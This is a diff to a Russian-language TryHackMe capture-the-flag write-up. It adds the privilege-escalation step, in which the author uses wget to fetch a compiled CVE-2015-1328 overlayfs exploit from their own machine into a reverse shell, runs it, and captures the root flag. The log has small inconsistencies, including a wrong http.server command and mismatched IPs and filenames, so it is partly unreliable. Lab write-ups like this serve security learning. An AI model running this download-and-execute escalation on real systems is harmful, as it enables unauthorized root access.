@@ -144,15 +144,54 @@ THM{Sh3llSh0ck_r0ckz}
 
 ## 3. Повышение привилегий
 
-*(раздел опускается, если в машине нет отдельного этапа эскалации)*
+Ранее я говорил, что версия целевой операционной системы - "Ubuntu 14.04.1 LTS". Поискав уязвимости под эту версию ОС, узнал, что в ней есть CVE-2015-1328, 
+Под которую есть эксплойт 'overlayfs' Local Privilege Escalation. Скачиваю код экплойта с exploit-db.com на kali. Как позже выяснилось, компилятора на целевой машине не было, поэтому пришлось компилировать на своей. Архитектуры машин совпадали, я скомпилировал код на Kali Linux статически, используя `gcc -static 37292.c -o exploit`. Запускаю питон-сервер, чтобы с него
+можно было скачать эксплойт через wget: `python3 -m http-server 8080`. Перехожу в консоль Реверс-шелла для скачивания файла эксплойта.
 
-Как был найден вектор повышения привилегий (linpeas, sudo -l, SUID, cron и т.д.) и как он эксплуатировался.
+```
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
 
-**Флаг root:** `flag`
+www-data@ubuntu:/tmp$ wget http://192.168.132.101:8080/exploit
+wget http://192.168.132.101:8080/exploit
+--2026-10-9 14:23:11--  http://192.168.132.101:8080
+Connecting to 192.168.131.101:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18432 (18K) [application/octet-stream]
+Saving to: 'ofs_exploit'
+
+exploit         100%[===================>]  18.00K  --.-KB/s    in 0.05s   
+
+2026-10-9 14:23:11 (360 KB/s) - 'exploit' saved [18432/18432]
+
+www-data@ubuntu:/tmp$ chmod +x exploit
+chmod +x exploit
+
+www-data@ubuntu:/tmp$ ./exploit
+spawning shells
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+root@ubuntu:/tmp# whoami
+whoami
+root
+
+root@ubuntu:/tmp# cd /root
+cd /root
+root@ubuntu:/root# ls
+ls
+root.txt
+
+root@ubuntu:/root# cat root.txt
+cat root.txt
+THM{g00d_j0b_0day_is_Pleased}
+
+```
+
+**Флаг root:** `THM{g00d_j0b_0day_is_Pleased}`
 
 ## Выводы
 
-- Какие уязвимости были использованы
+- Уязвимости, который были использованы: `shellshock`,  `CVE-2015-1328`
 - Как их можно было предотвратить
 - Что стоит запомнить/чему научился
 
